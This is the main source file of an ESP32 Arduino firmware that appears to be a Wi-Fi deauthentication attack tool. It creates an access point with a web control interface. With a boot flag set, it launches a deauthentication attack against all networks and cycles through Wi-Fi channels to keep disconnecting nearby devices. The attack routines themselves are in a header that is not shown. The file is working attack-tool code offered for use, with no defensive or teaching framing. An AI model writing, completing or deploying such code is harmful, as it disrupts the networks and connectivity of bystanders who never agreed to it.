#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "web_interface.h"
#include "deauth.h"
#include "definitions.h"

int curr_channel = 1;

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

  start_web_interface();

#if DEAUTH_TYPE_ALL_BOOT
Serial.println("DEAUTH_TYPE_ALL_BOOT is enabled. Starting deauth attack...");
uint16_t reason = 1; // Raison arbitraire (par exemple, 1)
start_deauth(0, DEAUTH_TYPE_ALL, reason);
#endif
}

void loop() {
  if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);
  } else {
    web_interface_handle_client();
  }
}